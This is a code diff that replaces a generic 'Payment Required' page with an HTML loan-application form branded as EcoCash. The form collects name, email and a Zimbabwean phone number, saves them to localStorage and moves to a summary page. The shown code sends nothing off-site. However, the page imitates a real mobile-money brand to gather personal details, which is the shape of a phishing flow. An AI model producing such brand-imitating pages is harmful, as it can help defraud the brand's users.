@@ -1,454 +1,308 @@
-```html
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Payment Required</title>
-
+    <title>EcoCash - Loan Application</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
+        
+        html,
         body {
-            min-height: 100vh;
-            font-family: Inter, Arial, sans-serif;
-            background:
-                radial-gradient(circle at 15% 20%, rgba(99,102,241,.25), transparent 30%),
-                radial-gradient(circle at 85% 80%, rgba(168,85,247,.22), transparent 30%),
-                linear-gradient(135deg, #070b1a, #111827 50%, #0b1020);
-            color: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 25px;
-            overflow-x: hidden;
-        }
-
-        .background-circle {
-            position: fixed;
-            border-radius: 50%;
-            filter: blur(2px);
-            pointer-events: none;
-        }
-
-        .circle-one {
-            width: 260px;
-            height: 260px;
-            background: rgba(99,102,241,.10);
-            top: -80px;
-            left: -80px;
-        }
-
-        .circle-two {
-            width: 320px;
-            height: 320px;
-            background: rgba(139,92,246,.08);
-            bottom: -120px;
-            right: -100px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 480px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .card {
-            background: rgba(17, 24, 39, .82);
-            border: 1px solid rgba(255,255,255,.10);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 28px;
-            padding: 42px 34px;
-            text-align: center;
-            box-shadow:
-                0 30px 80px rgba(0,0,0,.45),
-                inset 0 1px 0 rgba(255,255,255,.06);
-            animation: cardEnter .7s ease;
-        }
-
-        @keyframes cardEnter {
-            from {
-                opacity: 0;
-                transform: translateY(25px) scale(.97);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        .icon {
-            width: 82px;
-            height: 82px;
-            margin: 0 auto 25px;
-            border-radius: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 38px;
-            background: linear-gradient(135deg, #6366f1, #8b5cf6);
-            box-shadow: 0 15px 35px rgba(99,102,241,.30);
-        }
-
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 7px;
-            padding: 8px 13px;
-            border-radius: 50px;
-            background: rgba(245,158,11,.10);
-            border: 1px solid rgba(245,158,11,.25);
-            color: #fbbf24;
-            font-size: 12px;
-            font-weight: 700;
-            letter-spacing: .4px;
-            margin-bottom: 18px;
-        }
-
-        .dot {
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: #fbbf24;
-            box-shadow: 0 0 10px #fbbf24;
-        }
-
-        h1 {
-            font-size: clamp(28px, 7vw, 38px);
-            line-height: 1.15;
-            margin-bottom: 15px;
-            letter-spacing: -.8px;
-        }
-
-        .description {
-            color: #aab3c5;
-            font-size: 15px;
-            line-height: 1.7;
-            margin-bottom: 28px;
-        }
-
-        .notice {
-            text-align: left;
-            padding: 18px;
-            margin-bottom: 25px;
-            border-radius: 17px;
-            background: rgba(255,255,255,.04);
-            border: 1px solid rgba(255,255,255,.07);
-        }
-
-        .notice-row {
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            margin-bottom: 14px;
-        }
-
-        .notice-row:last-child {
-            margin-bottom: 0;
-        }
-
-        .check {
-            min-width: 23px;
-            height: 23px;
-            border-radius: 50%;
-            background: rgba(99,102,241,.16);
-            color: #a5b4fc;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 13px;
-            font-weight: bold;
-        }
-
-        .notice-text {
-            color: #d1d5db;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-        .payment-button {
-            width: 100%;
-            border: none;
-            border-radius: 15px;
-            padding: 17px 20px;
-            color: white;
-            font-size: 16px;
-            font-weight: 800;
-            cursor: pointer;
-            background: linear-gradient(135deg, #6366f1, #8b5cf6);
-            box-shadow: 0 12px 30px rgba(99,102,241,.28);
-            transition: .25s ease;
-            position: relative;
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
             overflow: hidden;
         }
-
-        .payment-button::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 70%;
-            height: 100%;
-            background: linear-gradient(
-                90deg,
-                transparent,
-                rgba(255,255,255,.20),
-                transparent
-            );
-            transform: skewX(-20deg);
-            transition: .6s;
-        }
-
-        .payment-button:hover::before {
-            left: 140%;
-        }
-
-        .payment-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 16px 35px rgba(99,102,241,.38);
-        }
-
-        .payment-button:active {
-            transform: scale(.98);
-        }
-
-        .secure {
-            margin-top: 20px;
-            color: #7f899d;
-            font-size: 12px;
+        
+        body {
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            gap: 7px;
+            padding: 10px;
         }
-
-        .footer {
-            text-align: center;
-            margin-top: 22px;
-            color: #657086;
-            font-size: 11px;
-        }
-
-        .modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,.72);
-            backdrop-filter: blur(7px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            z-index: 20;
-        }
-
-        .modal.active {
-            display: flex;
-        }
-
-        .modal-box {
+        
+        header {
             width: 100%;
-            max-width: 400px;
-            background: #111827;
-            border: 1px solid rgba(255,255,255,.10);
-            border-radius: 24px;
-            padding: 30px;
-            text-align: center;
-            animation: modalEnter .3s ease;
-        }
-
-        @keyframes modalEnter {
-            from {
-                opacity: 0;
-                transform: scale(.94);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-
-        .modal-icon {
-            font-size: 42px;
-            margin-bottom: 15px;
-        }
-
-        .modal-box h2 {
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 10px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
-
-        .modal-box p {
-            color: #9ca3af;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 22px;
-        }
-
-        .close-btn {
-            width: 100%;
-            padding: 13px;
+        
+        .back-btn {
+            font-size: 28px;
+            background: none;
             border: none;
-            border-radius: 12px;
             cursor: pointer;
-            background: #1f2937;
-            color: #fff;
+            color: #333;
+        }
+        
+        .logo {
+            font-size: 28px;
             font-weight: 700;
         }
-
-        @media (max-width: 500px) {
-            body {
-                padding: 15px;
-            }
-
-            .card {
-                padding: 32px 22px;
-                border-radius: 23px;
-            }
-
-            .icon {
-                width: 72px;
-                height: 72px;
-                font-size: 32px;
-            }
+        
+        .logo-eco {
+            color: #0066ff;
+        }
+        
+        .logo-cash {
+            color: #ff0000;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            flex: 1;
+            margin-bottom: 10px;
+        }
+        
+        .form-title {
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 30px auto;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 66%;
+            height: 100%;
+            background: linear-gradient(to right, #4361ee, #7209b7);
+        }
+        
+        .step-text {
+            text-align: center;
+            color: #777;
+            font-size: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .name-group {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 24px;
+        }
+        
+        .name-group>div {
+            flex: 1;
+        }
+        
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        .form-input:focus {
+            border-color: #4361ee;
+            outline: none;
+        }
+        
+        .invalid {
+            border-color: #e74c3c !important;
+        }
+        
+        .phone-group {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            padding: 0 16px;
+            margin-bottom: 10px;
+            transition: border 0.3s;
+        }
+        
+        .phone-group.invalid {
+            border-color: #e74c3c !important;
+        }
+        
+        .phone-prefix {
+            color: #666;
+            font-size: 16px;
+            margin-right: 10px;
+        }
+        
+        .phone-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 16px 0;
+            font-size: 16px;
+        }
+        
+        .phone-input:focus~.phone-group {
+            border-color: #4361ee;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 40px;
+        }
+        
+        .prev-btn,
+        .next-btn {
+            flex: 1;
+            padding: 18px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        
+        .prev-btn {
+            background: #eee;
+            color: #666;
+        }
+        
+        .next-btn {
+            background: linear-gradient(to right, #4361ee, #7209b7);
+            color: white;
+        }
+        
+        footer {
+            padding: 20px;
+            color: #aaa;
+            font-size: 13px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
         }
     </style>
 </head>
 
 <body>
+    <header>
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div></div>
+    </header>
 
-    <div class="background-circle circle-one"></div>
-    <div class="background-circle circle-two"></div>
+    <main class="card">
+        <h1 class="form-title">Loan Application</h1>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div class="step-text">Step 2 of 3</div>
 
-    <main class="container">
-
-        <section class="card">
-
-            <div class="icon">
-                💳
+        <div class="name-group">
+            <div>
+                <label class="form-label">First Name</label>
+                <input type="text" class="form-input" id="firstName" placeholder="John">
             </div>
-
-            <div class="badge">
-                <span class="dot"></span>
-                PAYMENT REQUIRED
+            <div>
+                <label class="form-label">Last Name</label>
+                <input type="text" class="form-input" id="lastName" placeholder="Doe">
             </div>
-
-            <h1>Make a Payment to Continue</h1>
-
-            <p class="description">
-                To access and continue using this website, please
-                complete the required payment. Your access will be
-                activated after the payment has been successfully
-                confirmed.
-            </p>
-
-            <div class="notice">
-
-                <div class="notice-row">
-                    <div class="check">✓</div>
-                    <div class="notice-text">
-                        Complete the payment through our secure payment process.
-                    </div>
-                </div>
-
-                <div class="notice-row">
-                    <div class="check">✓</div>
-                    <div class="notice-text">
-                        Your access will be enabled after successful confirmation.
-                    </div>
-                </div>
-
-                <div class="notice-row">
-                    <div class="check">✓</div>
-                    <div class="notice-text">
-                        Do not share your payment credentials with anyone.
-                    </div>
-                </div>
-
-            </div>
-
-            <button class="payment-button" id="paymentButton">
-                Make Payment →
-            </button>
-
-            <div class="secure">
-                🔒 Secure payment process
-            </div>
-
-        </section>
-
-        <div class="footer">
-            © 2026 Your Website. All rights reserved.
         </div>
 
+        <label class="form-label">Email Address</label>
+        <input type="email" class="form-input" id="email" placeholder="john.doe@example.com" style="margin-bottom:24px;">
+
+        <label class="form-label">Phone Number</label>
+        <div class="phone-group" id="phoneGroup">
+            <span class="phone-prefix">+263</span>
+            <input type="tel" class="phone-input" id="phone" placeholder="771234567">
+        </div>
+        <small style="color:#999; display:block; margin-bottom:30px;">Enter 9 digits (e.g. 771234567)</small>
+
+        <div class="btn-group">
+            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+            <button class="next-btn" id="nextBtn">NEXT STEP</button>
+        </div>
     </main>
 
-    <!-- Confirmation Modal -->
-    <div class="modal" id="paymentModal">
-
-        <div class="modal-box">
-
-            <div class="modal-icon">💳</div>
-
-            <h2>Continue to Payment</h2>
-
-            <p>
-                You will be redirected to the secure payment page
-                to complete your payment.
-            </p>
-
-            <button class="payment-button" id="continueButton">
-                Continue →
-            </button>
-
-            <br><br>
-
-            <button class="close-btn" id="closeButton">
-                Cancel
-            </button>
-
-        </div>
-
-    </div>
+    <footer>© 2025 EcoCash</footer>
 
     <script>
-        const paymentButton = document.getElementById("paymentButton");
-        const paymentModal = document.getElementById("paymentModal");
-        const closeButton = document.getElementById("closeButton");
-        const continueButton = document.getElementById("continueButton");
+        // Pre-fill if user goes back
+        if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
+        if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
+        if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
+        if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');
 
-        paymentButton.addEventListener("click", () => {
-            paymentModal.classList.add("active");
-        });
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
 
-        closeButton.addEventListener("click", () => {
-            paymentModal.classList.remove("active");
-        });
+            // Reset invalid styles
+            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => el.classList.remove('invalid'));
 
-        continueButton.addEventListener("click", () => {
+            let valid = true;
 
-            /*
-             * Replace this with your legitimate payment gateway URL.
-             *
-             * Example:
-             * window.location.href = "payment.html";
-             */
-
-            window.location.href = "payment.html";
-        });
-
-        paymentModal.addEventListener("click", (event) => {
-            if (event.target === paymentModal) {
-                paymentModal.classList.remove("active");
+            if (!firstName) {
+                document.getElementById('firstName').classList.add('invalid');
+                valid = false;
             }
+            if (!lastName) {
+                document.getElementById('lastName').classList.add('invalid');
+                valid = false;
+            }
+            if (!email || !email.includes('@') || !email.includes('.')) {
+                document.getElementById('email').classList.add('invalid');
+                valid = false;
+            }
+            if (!phone || phone.length !== 9 || !/^\d+$/.test(phone)) {
+                document.getElementById('phoneGroup').classList.add('invalid');
+                valid = false;
+            }
+
+            if (!valid) {
+                alert('Please complete all fields correctly.\n• Email must be valid\n• Phone must be exactly 9 digits');
+                return;
+            }
+
+            // Save to localStorage
+            localStorage.setItem('firstName', firstName);
+            localStorage.setItem('lastName', lastName);
+            localStorage.setItem('email', email);
+            localStorage.setItem('phone', phone);
+
+            // Go to summary (clean URL)
+            window.location.href = 'summary.html';
         });
     </script>
-
 </body>
+
 </html>
-```
